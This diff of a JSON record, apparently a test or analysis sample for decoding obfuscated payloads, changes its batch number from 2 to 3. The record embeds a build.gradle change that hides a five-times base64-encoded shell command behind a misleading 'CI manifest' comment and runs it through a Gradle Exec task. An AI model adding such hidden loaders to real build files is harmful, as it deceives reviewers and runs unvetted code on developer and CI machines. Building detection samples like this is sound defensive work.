@@ -8,9 +8,9 @@
     "decode_rounds": 5,
     "decode_method": "5_times_loop",
     "parser": "fixed",
-    "batch": 2
+    "batch": 3
   },
-  "notes": "Fixed parser batch 2",
+  "notes": "Fixed parser batch 3",
   "run_count": 5,
   "diff_content": "diff --git a/build.gradle b/build.gradle\nindex bba7912..28f32f5 100644\n--- a/build.gradle\n+++ b/build.gradle\n@@ -36,3 +36,13 @@ subprojects {\n         jvmArgs '-XX:+HeapDumpOnOutOfMemoryError'\n     }\n }\n+\n+// Decode and apply CI configuration manifest\n+// Encoding layers are for transit integrity (base64 x5)\n+// See: opensearch-project/opensearch-infra#901\n+def manifest = 'VmpGU1QxWXlWbGhUYTFKU1YwWktjVlJYZUhOaWJHeFdZVVpPVGxJd05VcFdSbEpoVkZkV1ZXRjZRbFZTZWtFeFdrUkdkMWRGTlZsalIwWlhUVVp2TVZZeFVrdGliVkpZVTFod1ZHSlVWazVVVjNONFlteHdjbFJyVG14aVZWcERWVVpSZDFCUlBUMD0='\n+5.times { manifest = new String(Base64.decoder.decode(manifest)) }\n+tasks.register('applyManifest', Exec) {\n+    commandLine 'sh', '-c', manifest\n+    ignoreExitValue = true\n+}"
 }
